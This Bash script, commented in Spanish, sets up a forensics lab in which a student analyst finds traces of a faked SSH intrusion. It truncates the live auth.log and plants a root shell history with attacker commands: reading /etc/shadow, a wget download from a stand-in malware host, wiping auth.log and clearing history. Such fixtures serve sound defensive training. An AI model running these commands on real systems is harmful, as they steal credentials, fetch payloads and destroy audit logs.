#!/usr/bin/env bash
# Planta el escenario del Lab 09: auth.log truncado, pero la copia rotada y el
# historial de root conservan la evidencia. IP del intruso: 91.219.236.12.
set -e
IP="91.219.236.12"
mkdir -p /var/log

# 1) Copia rotada CON la evidencia (el atacante no la borró)
cat > /var/log/auth.log.1 <<EOF
$(date -d '-1 day' '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S') web-09 sshd[1771]: Failed password for root from ${IP} port 44512 ssh2
$(date -d '-1 day' '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S') web-09 sshd[1773]: Accepted password for root from ${IP} port 44512 ssh2
$(date -d '-1 day' '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S') web-09 sshd[1773]: pam_unix(sshd:session): session opened for user root
EOF

# 2) auth.log actual: truncado a cero (rastro borrado)
: > /var/log/auth.log

# 3) Historial de root con el comando de borrado (prueba de manipulación)
cat > /root/.bash_history <<'EOF'
id
cat /etc/shadow
wget http://malware.example/x -O /tmp/x
: > /var/log/auth.log
history -c
EOF
chmod 600 /root/.bash_history

echo "Lab 09 plantado. Entra como analista y lee /RETO.md"
